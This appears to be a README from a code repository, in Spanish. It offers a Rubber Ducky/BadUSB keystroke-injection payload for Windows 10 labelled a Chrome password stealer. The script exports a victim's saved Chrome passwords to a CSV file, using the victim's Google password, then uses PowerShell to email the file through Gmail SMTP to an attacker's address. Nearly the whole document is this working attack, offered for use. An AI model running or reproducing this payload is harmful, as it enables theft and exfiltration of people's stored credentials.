# better-google-password-grabber
Solia ocupar esos payloads para Rubber Ducky o bad-usb, muchos estan desactualizados ya que google implementa mas medidas de seguridad cada dia, en fin... para este payload necesitas la contraseña de la cuenta de google de la victima.




REM Author: DiegoJRV \n
REM Ducky chrome password stealer for Windows 10\n
Delay 1000\n
REM ----------- opens chrome web browser\n
GUI r\n
DELAY 500\n
STRING chrome\n
DELAY 400\n
ENTER\n
DELAY 600\n
REM ----------- exports passwords into csv file\n
STRING chrome://settings/passwords\n
ENTER\n
DELAY 1000\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
TAB\n
DELAY 100\n
ENTER\n
DELAY 200\n
F5\n
DELAY 1000\n
CTRL f\n
DELAY 1000\n
STRING ayuda\n
DELAY 1000\n
ENTER\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
ENTER\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 200\n
ENTER\n
DELAY 1000\n
CTRL f\n
DELAY 1000\n
STRING exportar contrase\n
DELAY 1000\n
ENTER\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
TAB\n
DELAY 1000\n
ENTER\n
DELAY 2000\n
TAB\n
DELAY 2000\n
ENTER\n
DELAY 1000\n
ENTER\n
DELAY 4000\n
STRING CONTRASEÑA DEL CORREO (VICTIMA)\n
DELAY 1000\n
ENTER\n
DELAY 7000\n
STRING chromepasswords.csv\n
DELAY 2000\n
ENTER\n
DELAY 1000\n
CONTROL W\n
DELAY 100\n
REM -------------- sends it by email using powershell\n
GUI r\n
DELAY 200\n
STRING powershell\n
ENTER\n
DELAY 500\n
STRING $SMTPServer = 'smtp.gmail.com'\n
ENTER\n
DELAY 100\n
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n
ENTER\n
DELAY 100\n
STRING $SMTPInfo.EnableSSL = $true\n
ENTER\n
DELAY 100\n
REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps\n
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE ENVIARA)\n
ALTGR q\n
STRING gmail.com', 'CONTRASEÑA DEL CORREO')\n
ENTER\n
DELAY 100\n
STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage\n
ENTER\n
DELAY 100\n
STRING $E.From = 'PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE ENVIARA)\n
ALTGR q\n
STRING gmail.com'\n
ENTER\n
DELAY 100\n
STRING $E.To.Add('PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE RECIBIRÁ)\n
ALTGR q\n
STRING gmail.com')\n
ENTER\n
DELAY 100\n
STRING $E.Subject = $env:UserName\n
ENTER\n
DELAY 100\n
STRING $E.Body = 'Success! The password file is attached!'\n
ENTER\n
DELAY 100\n
STRING $F = 'Downloads/chromepasswords.csv'\n
ENTER\n
DELAY 100\n
STRING $E.Attachments.Add($F)\n
ENTER\n
DELAY 100\n
STRING $F = $SMTPInfo.Send($E)\n
ENTER\n
DELAY 100\n
STRING exit\n
DELAY 100\n
ENTER\n
